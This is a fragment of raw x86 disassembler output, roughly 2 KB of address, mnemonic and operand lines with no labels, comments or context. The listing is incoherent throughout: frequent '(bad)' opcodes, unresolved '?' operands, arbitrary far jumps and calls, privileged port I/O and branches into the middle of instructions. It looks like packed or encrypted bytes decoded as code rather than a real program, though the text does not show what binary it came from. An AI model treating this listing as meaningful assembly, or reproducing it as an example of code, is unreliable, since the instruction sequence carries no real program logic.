  423bfa:	sbb    DWORD PTR [ecx+esi*1-0x48e89c32],edx
  423c01:	jne    0x423be0
  423c03:	test   al,0x9c
  423c05:	ret    0xae4f
  423c08:	add    eax,0x372048db
  423c0d:	cld    
  423c0e:	pushf  
  423c0f:	or     DWORD PTR [edx],ebp
  423c11:	je     0x423bf9
  423c13:	add    al,0x91
  423c15:	cmp    eax,0xf98cce5d
  423c1a:	ins    BYTE PTR es:[edi],dx
  423c1b:	in     eax,0x1d
  423c1d:	imul   esi,eax,0x655d015
  423c23:	jmp    0x147e:0x3ff724af
  423c2a:	xor    DWORD PTR [esi],esp
  423c2c:	cmp    ah,BYTE PTR [edi]
  423c2e:	xchg   ecx,eax
  423c2f:	mov    ah,0x7f
  423c31:	(bad)  
  423c32:	pop    edx
  423c33:	jmp    0xf234:0x1308bf1
  423c3a:	das    
  423c3b:	mov    al,BYTE PTR [edx]
  423c3d:	dec    eax
  423c3e:	mov    esi,0x9984aa7a
  423c43:	les    eax,FWORD PTR [edi-0x53]
  423c46:	call   0x9fc5fbdc
  423c4b:	push   0x81e219a7
  423c50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c51:	sbb    DWORD PTR [ebx],ecx
  423c53:	xor    eax,0xcefb8ec
  423c58:	mov    WORD PTR [edi-0x37],ds
  423c5b:	or     dh,ch
  423c5d:	lds    ecx,FWORD PTR [edi]
  423c5f:	mov    esi,0x8eaf03af
  423c64:	sbb    esi,DWORD PTR [edx-0x1faa863]
  423c6a:	pop    ebp
  423c6b:	push   edi
  423c6c:	loope  0x423ce2
  423c6e:	cli    
  423c6f:	into   
  423c70:	mov    al,0x8
  423c72:	mov    dh,0xfe
  423c74:	jno    0x423c70
  423c76:	jge    0x423c96
  423c78:	or     ebx,DWORD PTR [eax+0x33]
  423c7b:	mov    ebx,0x63ae4fff
  423c80:	xor    esp,ebx
  423c82:	outs   dx,BYTE PTR ds:[esi]
  423c83:	xchg   esp,eax
  423c84:	fidivr WORD PTR [ecx+0x4a130e47]
  423c8a:	mov    ds:0x169b013,al
  423c8f:	pop    es
  423c90:	push   cs
  423c91:	scas   eax,DWORD PTR es:[edi]
  423c92:	mov    WORD PTR [edx+0x40],gs
  423c95:	cmc    
  423c96:	xlat   BYTE PTR ds:[ebx]
  423c97:	push   edi
  423c98:	cmp    bh,BYTE PTR [eax-0x2878ed3d]
  423c9e:	loopne 0x423ccf
  423ca0:	fcomp  DWORD PTR [ecx+ebp*8+0x56]
  423ca4:	jno    0x423cab
  423ca6:	jle    0x423c74
  423ca8:	sub    al,0xed
  423caa:	je     0x423ca3
  423cac:	enter  0xd7fb,0x83
  423cb0:	jmp    0x402d:0xb23a8477
  423cb7:	xor    edx,0xffffffc5
  423cba:	(bad)  
  423cbb:	sbb    al,BYTE PTR [edx+0x507bbf62]
  423cc1:	jbe    0x423cd6
  423cc3:	dec    ecx
  423cc4:	sbb    edx,edi
  423cc6:	aaa    
  423cc7:	enter  0xe440,0x7
  423ccb:	push   edi
  423ccc:	push   edx
  423ccd:	dec    ebp
  423cce:	iret   
  423ccf:	test   edi,edi
  423cd1:	sub    al,0xec
  423cd3:	bound  ecx,QWORD PTR [edi]
  423cd5:	add    dl,BYTE PTR [edi-0xd]
  423cd8:	retf   0xe64c
  423cdb:	xlat   BYTE PTR ds:[ebx]
  423cdc:	outs   dx,BYTE PTR ds:[esi]
  423cdd:	pop    ebx
  423cde:	out    0x32,al
  423ce0:	jg     0x423ce9
  423ce2:	sub    esp,ebp
  423ce4:	push   ecx
  423ce5:	or     al,BYTE PTR [edi]
  423ce7:	fwait
  423ce8:	outs   dx,DWORD PTR ds:[esi]
  423ce9:	call   0xe21b2771
  423cee:	out    dx,al
  423cef:	ss das 
  423cf1:	call   0xbd220e89
  423cf6:	retf   0x2d39
  423cf9:	add    DWORD PTR [ebx+0x62216176],0x45cf716
  423d03:	dec    esp
  423d04:	sbb    al,0xf9
  423d06:	mov    ds:0xfe1f587d,eax
  423d0b:	inc    edi
  423d0c:	call   0x5df:0x76725d55
  423d13:	mov    edx,0x71ceb223
  423d18:	mov    ebx,0x638aae3d
  423d1d:	mov    ds:0x6a3dd259,al
  423d22:	add    bl,cl
  423d24:	dec    esi
  423d25:	out    0x26,al
  423d27:	fiadd  WORD PTR [esi+ecx*1]
  423d2a:	adc    BYTE PTR [esp+eax*8-0x6e],0x12
  423d2f:	(bad)  
  423d30:	int3   
  423d31:	fcomp  DWORD PTR [ebx-0x33a1a32c]
  423d37:	and    BYTE PTR cs:[edx-0x34ee8d60],bl
  423d3e:	sbb    ah,ch
  423d40:	cmp    ebp,DWORD PTR [edi-0x2feebe89]
  423d46:	sar    BYTE PTR gs:[ebp+0x50],1
  423d4a:	jo     0x423d20
  423d4c:	shr    BYTE PTR [edx],cl
  423d4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d4f:	and    al,0xdc
  423d51:	(bad)  
  423d52:	sub    esi,DWORD PTR [ecx+0x41]
  423d55:	fwait
  423d56:	cld    
  423d57:	mov    ch,0xa9
  423d59:	popa   
  423d5a:	outs   dx,BYTE PTR ds:[esi]
  423d5b:	add    esi,DWORD PTR [ebp+0x63f2498b]
  423d61:	das    
  423d62:	pop    esp
  423d63:	mov    ecx,0xdb107ba3
  423d68:	lahf   
  423d69:	push   0x8a584b55
  423d6e:	dec    esi
  423d6f:	xchg   ecx,eax
  423d70:	retf   0xcb56
  423d73:	sub    eax,0x8348e48e
  423d78:	mov    dl,0x63
  423d7a:	adc    eax,0x46444aed
  423d7f:	xlat   BYTE PTR ds:[ebx]
  423d80:	inc    DWORD PTR [ebx+0x16dfca4e]
  423d86:	fxch   st(1)
  423d88:	(bad)  
  423d89:	ret    0x53e4
  423d8c:	add    ecx,DWORD PTR [ebx+0x66]
  423d8f:	pushw  0x632
  423d93:	push   es
  423d94:	pop    eax
  423d95:	adc    al,0xb8
  423d97:	bound  ebx,QWORD PTR [ebx-0x7b937451]
  423d9d:	repz or BYTE PTR [edx+0x3a],0x62
  423da2:	push   esi
  423da3:	pusha  
  423da4:	jne    0x423d40
  423da6:	mov    eax,ds:0x49e82ba0
  423dab:	cdq    
  423dac:	adc    bh,BYTE PTR [ecx]
  423dae:	dec    dh
  423db0:	cmovge edi,DWORD PTR [edx]
  423db3:	pop    ss
  423db4:	sbb    BYTE PTR [esi-0x56],cl
  423db7:	call   0x7a1b:0xdac5d913
  423dbe:	jns    0x423e17
  423dc0:	fnstsw WORD PTR [ebx-0x482b564c]
  423dc6:	inc    ecx
  423dc7:	fidiv  DWORD PTR [eax]
  423dc9:	cmp    BYTE PTR [edi],0x98
  423dcc:	test   BYTE PTR [edi+0x3b489d6b],dl
  423dd2:	pop    ds
  423dd3:	pop    ebp
  423dd4:	jge    0x423e1d
  423dd6:	push   edx
  423dd7:	sub    ebp,eax
  423dd9:	jae    0x423e59
  423ddb:	jmp    0x29406aae
  423de0:	(bad)  
  423de1:	fist   DWORD PTR [eax-0x25]
  423de4:	mov    eax,0xcc49f050
  423de9:	sub    bp,WORD PTR [ebx-0xc]
  423ded:	or     dh,BYTE PTR [ebx+esi*1-0x3b3696eb]
  423df4:	retf   0x1be3
  423df7:	dec    esp
  423df8:	fldenv [edi-0x39]
  423dfb:	pushf  
  423dfc:	arpl   WORD PTR ds:0x1aabc8f7,bp
  423e02:	maxps  xmm7,XMMWORD PTR [ebx-0x8]
  423e06:	push   DWORD PTR [edi]
  423e08:	imul   edx,ebx,0x5458cada
  423e0e:	jae    0x423e82
  423e10:	jno    0x423e27
  423e12:	mov    esi,0x5e6fff7d
  423e17:	inc    esi
  423e18:	mov    esp,0xb5a191c0
  423e1d:	inc    esi
  423e1e:	ins    BYTE PTR es:[edi],dx
  423e1f:	jp     0x423dbf
  423e21:	push   0x6a
  423e23:	jp     0x423dfa
  423e25:	loop   0x423e8a
  423e27:	lds    esp,FWORD PTR [esi+0x36]
  423e2a:	ret    0xdc62
  423e2d:	push   ds
  423e2e:	js     0x423dbd
  423e30:	mov    ebp,0x6be8085b
  423e35:	mov    BYTE PTR [ecx],bl
  423e37:	and    BYTE PTR [ebp+0x20],0x8f
  423e3b:	les    ecx,FWORD PTR [eax-0x6f3bfc08]
  423e41:	fdivp  st(1),st
  423e43:	jmp    0x716b:0x9c0796a6
  423e4a:	lock mov DWORD PTR [edi+eax*4-0x47],eax
  423e4f:	inc    ebp
  423e50:	fcmovnbe st,st(0)
  423e52:	push   ebp
  423e53:	pop    ebp
  423e54:	and    eax,0xb96bfd5
  423e59:	icebp  
  423e5a:	push   ebx
  423e5b:	mov    al,0x47
  423e5d:	push   ss
  423e5e:	add    esp,DWORD PTR [ebx]
  423e60:	dec    edx
  423e61:	call   0x7934:0xa5a32953
  423e68:	retf   0x106c
  423e6b:	mov    ecx,0x3ed3a514
  423e70:	clc    
  423e71:	push   edx
  423e72:	add    eax,0xe9ff9149
  423e77:	daa    
  423e78:	xchg   ebp,eax
  423e79:	and    DWORD PTR [esi-0x5d64c5b1],0xb4379107
  423e83:	ss int 0x89
  423e86:	rol    BYTE PTR es:[esi+ecx*4],0x1
  423e8b:	fcomi  st,st(6)
  423e8d:	sub    BYTE PTR [ecx+eax*2],dh
  423e90:	jb     0x423e76
  423e92:	loopne 0x423edb
  423e94:	add    edi,DWORD PTR [edi+0x6a]
  423e97:	and    bh,ah
  423e99:	dec    ebx
  423e9a:	adc    al,0xd8
  423e9c:	bound  ebx,QWORD PTR [ebx-0x52d73bc5]
  423ea2:	and    cl,0x20
  423ea5:	data16 fsubrp st(1),st
  423ea9:	test   DWORD PTR [esi-0x52b57190],ecx
  423eaf:	and    bl,bh
  423eb1:	and    DWORD PTR [edx],eax
  423eb3:	sbb    ebx,ebp
  423eb5:	shr    BYTE PTR [eax+0x7d23f09b],cl
  423ebb:	pusha  
  423ebc:	aas    
  423ebd:	push   ecx
  423ebe:	push   cs
  423ebf:	and    ch,dl
  423ec1:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  423ec3:	into   
  423ec4:	lock hlt 
  423ec6:	inc    ebx
  423ec7:	sub    BYTE PTR [eax+0x40],ah
  423eca:	lds    ebp,FWORD PTR [edx+edx*2+0x63f008e9]
  423ed1:	cmc    
  423ed2:	(bad)  
  423ed3:	jge    0x423f41
  423ed5:	lods   al,BYTE PTR ds:[esi]
  423ed6:	xchg   edi,eax
  423ed7:	sub    ch,cl
  423ed9:	(bad)  
  423eda:	mov    bl,BYTE PTR [esp+ebp*4+0x6a]
  423ede:	push   0x508fc18b
  423ee3:	adc    eax,0x8cc44bba
  423ee8:	jae    0x423ea2
  423eea:	cmc    
  423eeb:	dec    ebx
  423eec:	pop    esi
  423eed:	xor    dl,BYTE PTR [ecx+0x5c7b7be3]
  423ef3:	adc    DWORD PTR [edx],ebx
  423ef5:	dec    eax
  423ef6:	jmp    0x63b0:0x71153b09
  423efd:	push   0x58400cd8
  423f02:	xchg   DWORD PTR [esi-0x5f],edi
  423f05:	sti    
  423f06:	jmp    0xd9fb:0x3e92a37b
  423f0d:	xor    esp,DWORD PTR [ecx-0x11]
  423f10:	gs sbb al,0x5
  423f13:	xchg   BYTE PTR [ebp-0x59],dl
  423f16:	fidivr WORD PTR [ebp+ebx*2+0x50]
  423f1a:	lods   al,BYTE PTR ds:[esi]
  423f1c:	clc    
  423f1d:	and    eax,0x712ddda9
  423f22:	cmp    cl,BYTE PTR [esi-0x39]
  423f25:	mov    edx,0x40bdd8ec
  423f2a:	add    DWORD PTR [edx-0x313927ce],ebx
  423f30:	push   ebp
  423f31:	lahf   
  423f32:	sub    BYTE PTR [eax-0x630f1f61],dl
  423f38:	pop    esp
  423f39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f3a:	idiv   BYTE PTR [esi]
  423f3c:	es pusha 
  423f3e:	(bad)  
  423f3f:	fs into 
  423f41:	rol    BYTE PTR [edi+0x1d],1
  423f44:	sub    eax,0xcc1c51d4
  423f49:	jae    0x423f77
  423f4b:	mov    eax,0x848748fd
  423f50:	mov    ds:0x36433600,eax
  423f55:	jmp    0x423edf
  423f57:	cld    
  423f58:	push   ecx
  423f59:	sub    eax,0x37895134
  423f5e:	sbb    BYTE PTR [ebp-0x1e],dh
  423f61:	and    BYTE PTR [ecx+esi*1],ch
  423f64:	ja     0x423fa9
  423f66:	lock arpl WORD PTR [edi],ax
  423f69:	(bad)  
  423f6a:	adc    ebp,DWORD PTR [edi]
  423f6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f6d:	xor    ebp,0xffffffd7
  423f70:	repz gs stc 
  423f73:	pop    es
  423f74:	mov    dl,0x34
  423f76:	and    ah,BYTE PTR [edx-0x4e0a57ab]
  423f7c:	sbb    dl,BYTE PTR ds:0x35f8134f
  423f82:	outs   dx,DWORD PTR ds:[esi]
  423f83:	js     0x423ff9
  423f85:	and    eax,edi
  423f87:	mov    al,ds:0xdbaaf4cd
  423f8c:	xlat   BYTE PTR ds:[ebx]
  423f8d:	aam    0x45
  423f8f:	call   0x238d:0xc8103928
  423f96:	(bad)  
  423f97:	pushf  
  423f98:	push   cs
  423f99:	lods   al,BYTE PTR ds:[esi]
  423f9a:	mov    ch,0x50
  423f9c:	cmp    edx,DWORD PTR [eax]
  423f9e:	pop    ds
  423f9f:	inc    esp
  423fa0:	mov    eax,0x7ff2108d
  423fa5:	dec    edi
  423fa6:	inc    ebx
  423fa7:	ret    0xc9f4
  423faa:	sbb    al,0x1d
  423fac:	lahf   
  423fad:	mov    bl,BYTE PTR [ecx+0x6e]
  423fb0:	(bad)  
  423fb1:	pop    edi
  423fb2:	jmp    0x423fa5
  423fb4:	lds    ebx,FWORD PTR [edx+0x5b48b8cc]
  423fba:	or     bh,BYTE PTR [esp+esi*4]
  423fbd:	mov    bh,0xfd
  423fbf:	push   esi
  423fc0:	fst    DWORD PTR [eax-0x67c08c8f]
  423fc6:	call   0x1da42d5f
  423fcb:	and    al,dl
  423fcd:	into   
  423fce:	mov    ds:0x5e85c8d7,al
  423fd3:	cdq    
  423fd4:	jo     0x424039
  423fd6:	mov    ebx,0x9de6703c
  423fdb:	mov    edx,0x937ec088
  423fe0:	and    dh,BYTE PTR [ebx+0x9]
  423fe3:	mov    esi,0x489385fc
  423fe8:	add    eax,0x1e6dfbd6
  423fed:	shr    BYTE PTR [esi+ebx*4+0x5],0x29
  423ff2:	int3   
  423ff3:	cmp    eax,esi
  423ff5:	jle    0x424054
  423ff7:	ins    DWORD PTR es:[edi],dx
  423ff8:	(bad)  
  423ff9:	pop    ebx
  423ffa:	pop    esp
  423ffb:	cmp    dh,BYTE PTR [edi]
  423ffd:	lock sub DWORD PTR [ebx-0x1e],ebp
  424001:	cmp    BYTE PTR [edx+0x776f77ac],dl
  424007:	sub    DWORD PTR [edx-0xa],esp
  42400a:	dec    edi
  42400b:	jmp    0x423fd4
  42400d:	mov    edx,0xb48faa99
  424012:	rcr    DWORD PTR [esp+ecx*2],1
  424015:	and    ecx,DWORD PTR [ecx+0x5cb26153]
  42401b:	ds ins DWORD PTR es:[edi],dx
  42401d:	or     al,0x37
  42401f:	addr16 and eax,0x9475f7a4
  424025:	mov    esi,0x9217d14c
  42402a:	(bad)  
  42402b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42402c:	ret    0xf6f3
  42402f:	icebp  
  424030:	pop    es
  424031:	pop    edx
  424032:	pop    edx
  424033:	dec    edi
  424034:	shl    BYTE PTR [ecx+0x3],1
  424037:	(bad)  
  424038:	push   cs
  424039:	inc    eax
  42403a:	not    BYTE PTR [eax]
  42403c:	xor    dh,ch
  42403e:	ds xor ebp,ecx
  424041:	xchg   DWORD PTR [eax],esi
  424043:	push   ebx
  424044:	cdq    
  424045:	push   eax
  424046:	dec    edi
  424047:	xchg   BYTE PTR [eax+0x1ee4af9e],ch
  42404d:	or     al,0xfe
  42404f:	cmp    ch,dl
  424051:	sbb    eax,0xd868cac3
  424056:	inc    edi
  424057:	mov    ds:0xab34a06d,eax
  42405c:	xchg   edi,eax
  42405d:	clc    
  42405e:	pop    esp
  42405f:	enter  0xb0fe,0xc
  424063:	into   
  424064:	sbb    BYTE PTR [ebp+0x57],cl
  424067:	loope  0x4240aa
  424069:	pushf  
  42406a:	jo     0x424053
  42406c:	sbb    eax,0xdd61af91
  424071:	adc    bl,ah
  424073:	jmp    0x67a1eae0
  424078:	jae    0x42404a
  42407a:	xchg   DWORD PTR ds:0xd6869ec3,edi
  424080:	mov    eax,0xf43f2f97
  424085:	js     0x424017
  424087:	loopne 0x424082
  424089:	es out 0x1e,eax
  42408c:	jge    0x424040
  42408e:	mov    ebx,0xea779595
  424093:	inc    ebp
  424094:	mov    esi,0x42f24ba7
  424099:	ror    BYTE PTR [ebp+0x17c87fd0],1
  42409f:	retf   0x9390
  4240a2:	fcmove st,st(3)
  4240a4:	scas   eax,DWORD PTR es:[edi]
  4240a5:	mov    ah,0x3c
  4240a7:	loop   0x424071
  4240a9:	rol    bl,0xc
  4240ac:	mov    cl,0x51
  4240ae:	sbb    dh,BYTE PTR [edx-0x7e]
  4240b1:	add    BYTE PTR [esi-0x6f0fba9b],ah
  4240b7:	in     eax,0x76
  4240b9:	or     eax,0x195d4737
  4240be:	push   ss
  4240bf:	scas   eax,DWORD PTR es:[edi]
  4240c0:	nop
  4240c1:	push   ebx
  4240c2:	adc    DWORD PTR [ebx+0x4af4b42f],0x26
  4240c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240ca:	inc    edi
  4240cb:	ret    0x4743
  4240ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240cf:	sbb    DWORD PTR [eax-0x74],ebp
  4240d2:	sub    bh,bh
  4240d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240d5:	xchg   esi,eax
  4240d6:	sub    BYTE PTR [ecx],0x1d
  4240d9:	ins    BYTE PTR es:[edi],dx
  4240da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240db:	jg     0x424103
  4240dd:	sahf   
  4240de:	fsubr  DWORD PTR [ecx]
  4240e0:	idiv   BYTE PTR [ebx+0x7]
  4240e3:	pop    esi
  4240e4:	retf   0x71e3
  4240e7:	lods   eax,DWORD PTR ds:[esi]
  4240e8:	xlat   BYTE PTR ds:[ebx]
  4240e9:	jo     0x4240c6
  4240eb:	cmc    
  4240ec:	cmc    
  4240ed:	cmp    ebp,DWORD PTR [eax]
  4240ef:	inc    ecx
  4240f0:	adc    edx,edx
  4240f2:	outs   dx,DWORD PTR ds:[esi]
  4240f3:	mov    DWORD PTR [edi],edi
  4240f5:	cwde   
  4240f6:	ins    BYTE PTR es:[edi],dx
  4240f7:	xchg   esp,eax
  4240f8:	dec    edi
  4240f9:	xlat   BYTE PTR ds:[ebx]
  4240fa:	mov    al,0x37
  4240fc:	addr16 mov eax,ds:0x4fe1
  424100:	mov    ds:0x7e3c41f5,eax
  424105:	pop    edi
  424106:	xor    esi,DWORD PTR [esp+ecx*4-0x6f]
  42410a:	iret   
  42410b:	jns    0x4240e4
  42410d:	rcr    DWORD PTR [esi],0xd5
  424110:	sar    DWORD PTR [eax+0x79],cl
  424113:	adc    DWORD PTR [edi-0x451c097b],esi
  424119:	in     eax,0x8f
  42411b:	(bad)  
  42411c:	rol    DWORD PTR [edx+0x22e2912f],1
  424122:	add    edx,esp
  424124:	aam    0x6c
  424126:	test   eax,0x505b880a
  42412b:	std    
  42412c:	daa    
  42412d:	call   0x51af5179
  424132:	retf   0x3cea
  424135:	pop    esp
  424136:	imul   edi,DWORD PTR [edx-0x3d],0xffffffe3
  42413a:	jl     0x424125
  42413c:	sbb    BYTE PTR [edi-0x3019a5d8],al
  424142:	out    0x71,al
  424144:	rcl    bl,cl
  424146:	arpl   di,sp
  424148:	rol    BYTE PTR [ebx+edi*2+0x19],cl
  42414c:	dec    esi
  42414d:	(bad)  [ecx-0x34ed2377]
  424153:	dec    edx
  424154:	hlt    
  424155:	xchg   ebp,eax
  424156:	pop    ss
  424157:	iret   
  424158:	adc    al,0x18
  42415a:	push   0x9621a446
  42415f:	cwde   
  424160:	rcr    BYTE PTR [esi+ebp*2],1
  424163:	mov    cl,BYTE PTR [ecx]
  424165:	fild   DWORD PTR [ebp-0x5cee81d2]
  42416b:	add    BYTE PTR gs:0x18ee1692,ch
  424172:	pop    ds
  424173:	sahf   
  424174:	lea    esp,[edi]
  424176:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424177:	sbb    ch,ah
  424179:	pop    esp
  42417a:	shr    DWORD PTR [eax+0x3d],1
  42417d:	sub    dl,ch
  42417f:	adc    bl,dl
  424181:	loopne 0x4241e2
  424183:	jb     0x424199
  424185:	pop    esi
  424186:	add    ch,0x10
  424189:	mov    esp,0xe120837f
  42418e:	fisubr DWORD PTR [esi-0x655fcf4a]
  424194:	fwait
  424195:	aam    0x1c
  424197:	nop
  424198:	adc    eax,0x5604d6ff
  42419d:	mov    eax,ds:0xf6616d0a
  4241a2:	push   ebp
  4241a3:	aaa    
  4241a4:	push   es
  4241a5:	xchg   BYTE PTR [ebx-0x51938258],dh
  4241ab:	inc    eax
  4241ac:	lods   al,BYTE PTR ds:[esi]
  4241ad:	test   DWORD PTR [edi+0x19],0xba91a917
  4241b4:	(bad)  
  4241b5:	fwait
  4241b6:	rcl    BYTE PTR ds:0x962fb200,0x66
  4241bd:	dec    esp
  4241be:	push   cs
  4241bf:	mov    bl,0x19
  4241c1:	mov    WORD PTR [edx+esi*1+0x28],fs
  4241c5:	fisttp WORD PTR [edi+ebp*8]
  4241c8:	add    DWORD PTR [eax+0x54],edx
  4241cb:	mov    edi,0x46713365
  4241d0:	das    
  4241d1:	sub    edx,edx
  4241d3:	stos   DWORD PTR es:[edi],eax
  4241d4:	mov    al,ds:0x9801124e
  4241d9:	lahf   
  4241da:	outs   dx,DWORD PTR ds:[esi]
  4241db:	cmp    eax,0x846d2b2b
  4241e0:	popf   
  4241e1:	adc    al,BYTE PTR [esi+eiz*2]
  4241e4:	mov    ?,esi
  4241e6:	imul   edi,DWORD PTR [eax-0x43],0xffffffb7
  4241ea:	add    dl,0xa0
  4241ed:	(bad)  
  4241ef:	mov    WORD PTR [esi+0x3e],?
  4241f2:	mov    ch,0xd4
  4241f4:	or     BYTE PTR [ecx+0x35433ee8],ah
  4241fa:	dec    ebp
  4241fb:	mov    ebx,0x459fc653
  424200:	pop    ebp
  424201:	mov    DWORD PTR [edx+0x60],ebp
  424204:	ffreep st(4)
  424206:	add    esp,DWORD PTR [esi]
  424208:	in     al,0xa6
  42420a:	into   
  42420b:	js     0x424240
  42420d:	sbb    edx,ecx
  42420f:	mov    edi,0xc3f3139d
  424214:	data16 or al,0x7e
  424217:	pop    ecx
  424218:	or     eax,0xcedac01a
  42421d:	out    dx,eax
  42421e:	mov    dh,0x20
  424220:	mov    eax,0x3943c702
  424225:	jno    0x4241e0
  424227:	or     DWORD PTR [eax],ebx
  424229:	(bad)  
  42422a:	rcr    DWORD PTR [ecx-0x1b],cl
  42422d:	xor    al,BYTE PTR [esi+ebx*4]
  424230:	js     0x42428e
  424232:	fdiv   DWORD PTR ds:0x70fa4dde
  424238:	ss clc 
  42423a:	xchg   edx,eax
  42423b:	push   ss
  42423c:	and    eax,0x9a4e932f
  424241:	mov    ch,0x21
  424243:	scas   eax,DWORD PTR es:[edi]
  424244:	ss and eax,0xe995e2e6
  42424a:	sti    
  42424b:	cmp    al,0x5b
  42424d:	dec    ebx
  42424e:	mov    ah,0xc6
  424250:	mov    cl,0x9a
  424252:	cmp    ecx,ebx
  424254:	and    esp,DWORD PTR [ecx]
  424256:	sbb    dh,dh
  424258:	push   edx
  424259:	stos   DWORD PTR es:[edi],eax
  42425a:	(bad)  
  42425c:	add    eax,0x99e8ed23
  424261:	popa   
  424262:	xchg   DWORD PTR [ebx],ecx
  424264:	pop    edx
  424265:	mov    dl,0x94
  424267:	jge    0x4242c9
  424269:	xlat   BYTE PTR ds:[ebx]
  42426a:	fidivr DWORD PTR [esi]
  42426c:	das    
  42426d:	rcl    BYTE PTR [ecx],1
  42426f:	out    dx,eax
  424270:	cmp    BYTE PTR [bp+si+0x71],dh
  424274:	xor    DWORD PTR [esi],ebx
  424276:	inc    eax
  424277:	add    DWORD PTR [ebx-0x60bcb64b],0x379c3010
  424281:	pushf  
  424282:	ss js  0x42425c
  424285:	mov    eax,0x10788d33
  42428a:	inc    ebx
  42428b:	rcr    BYTE PTR cs:[eax+0x4a],cl
  42428f:	not    BYTE PTR [eax-0x54ff9f52]
  424295:	mov    WORD PTR [edi],?
  424297:	mov    WORD PTR [edx+0x75],?
  42429a:	xor    DWORD PTR [edi-0x3904bdc3],ecx
  4242a0:	adc    bl,ah
  4242a2:	pop    ecx
  4242a3:	jne    0x4242e2
  4242a5:	jae    0x424249
  4242a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242a8:	loop   0x4242fe
  4242aa:	test   BYTE PTR cs:[ecx],al
  4242ad:	pop    ss
  4242ae:	test   cl,dh
  4242b0:	sar    DWORD PTR [eax],1
  4242b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242b3:	xchg   edi,eax
  4242b4:	js     0x424321
  4242b6:	push   eax
  4242b7:	jo     0x424259
  4242b9:	push   ebp
  4242ba:	pop    esp
  4242bb:	pop    ecx
  4242bc:	jb     0x4242b8
  4242be:	push   0xffffffa1
  4242c0:	push   esp
  4242c1:	fcom   DWORD PTR [edi+0x77]
  4242c4:	in     eax,dx
  4242c5:	je     0x42427f
  4242c7:	scas   eax,DWORD PTR es:[edi]
  4242c8:	fldenv [edi-0x438ee956]
  4242ce:	mov    ah,0x8e
  4242d0:	outs   dx,BYTE PTR ds:[esi]
  4242d1:	inc    ebp
  4242d2:	push   eax
  4242d3:	sbb    al,0xff
  4242d5:	arpl   dx,ax
  4242d7:	ds mov esi,0x97e3aa03
  4242dd:	popf   
  4242de:	sbb    ebp,edi
  4242e0:	das    
  4242e1:	sbb    eax,0xefeab658
  4242e6:	out    0x46,eax
  4242e8:	leave  
  4242e9:	sbb    DWORD PTR [esi-0x4c],esi
  4242ec:	push   ds
  4242ed:	cmp    BYTE PTR [ebp+0x48],cl
  4242f0:	outs   dx,DWORD PTR ds:[esi]
  4242f1:	mov    eax,ds:0x92be27d6
  4242f6:	mov    edx,DWORD PTR [edx]
  4242f8:	(bad)  
  4242f9:	push   esp
  4242fa:	fnsave [edx+0x1706dd1b]
  424300:	sub    ebx,ecx
  424302:	lds    esi,FWORD PTR [ebx-0x6fe0301c]
  424308:	(bad)  
  424309:	shl    ebp,1
  42430b:	pop    ebp
  42430c:	adc    esp,DWORD PTR [esi+0x3b]
  42430f:	fcom   st(2)
  424311:	xlat   BYTE PTR ds:[ebx]
  424312:	les    ecx,FWORD PTR [eax-0x91d9ea3]
  424318:	ja     0x42435c
  42431a:	rcl    dh,1
  42431c:	pop    esp
  42431d:	data16 fisttp DWORD PTR [eax-0x1ebf00c2]
  424324:	push   cs
  424325:	sbb    bh,BYTE PTR [ebp+0xee49d6e]
  42432b:	jp     0x42431c
  42432d:	xchg   ebp,eax
  42432e:	icebp  
  42432f:	or     DWORD PTR [esi-0x41146c91],edx
  424335:	add    eax,0xc039407c
  42433a:	inc    ebx
  42433b:	fsubr  st(7),st
  42433d:	(bad)  
  42433e:	in     eax,0xb0
  424340:	and    dh,bl
  424342:	inc    esi
  424343:	cdq    
  424344:	fdiv   DWORD PTR ds:0xf196442f
  42434a:	dec    ecx
  42434b:	adc    DWORD PTR [eax+0x19e94107],esi
  424351:	mov    al,0xc5
  424353:	xor    al,0xc9
  424355:	es sar bl,1
  424358:	inc    esp
  424359:	icebp  
  42435a:	sub    BYTE PTR [ebp+eax*8-0x4a5fca3d],bh
  424361:	mov    BYTE PTR [esp+ebp*1-0x7b],bl
  424365:	out    0x78,eax
  424367:	pop    ebp
  424368:	inc    BYTE PTR [ebx]
  42436a:	mov    BYTE PTR [edi*2-0x4b7b9983],ch
  424371:	push   edi
  424372:	pop    eax
  424373:	mov    ah,0x6a
  424375:	jp     0x424330
  424377:	ret    
  424378:	out    0x50,al
  42437a:	xchg   esi,eax
  42437b:	(bad)  
  42437c:	pop    esi
  42437d:	push   esi
  42437e:	jmp    0x4243ff
  424380:	popf   
  424381:	lock inc edx
  424383:	cmc    
  424384:	dec    ebx
  424385:	arpl   WORD PTR [edx+0x3f32242b],dx
  42438b:	mov    esi,0xce901f05
  424390:	cmc    
  424391:	push   esi
  424392:	mov    ebx,0x86de4b26
  424397:	jecxz  0x4243f9
  424399:	sub    dh,ah
  42439b:	add    bl,bl
  42439d:	outs   dx,DWORD PTR ds:[esi]
  42439e:	cmp    edx,DWORD PTR [esi+ebx*8]
  4243a1:	mov    ebx,0x61856121
  4243a6:	inc    edi
  4243a7:	stos   BYTE PTR es:[edi],al
  4243a8:	js     0x424348
  4243aa:	cld    
  4243ab:	jns    0x4243c2
  4243ad:	push   ds
  4243ae:	adc    DWORD PTR [esi+eax*1+0x3a],0x2558aff1
  4243b6:	jmp    0x535291e2
  4243bb:	mov    ebx,0x8b266a0e
  4243c0:	(bad)  
  4243c1:	jb     0x4243c4
  4243c3:	daa    
  4243c4:	mul    BYTE PTR [ebp+0x1c]
  4243c7:	jno    0x4243e5
  4243c9:	mov    ds:0x4fee89f5,al
  4243ce:	and    dl,dl
  4243d0:	in     eax,0xad
  4243d2:	mov    edx,0x26a09ac8
  4243d7:	mov    DWORD PTR [ecx-0x3a14387b],ebx
  4243dd:	mov    bh,BYTE PTR [ecx+0x4e]
  4243e0:	sar    BYTE PTR [eax+0x4650689a],1
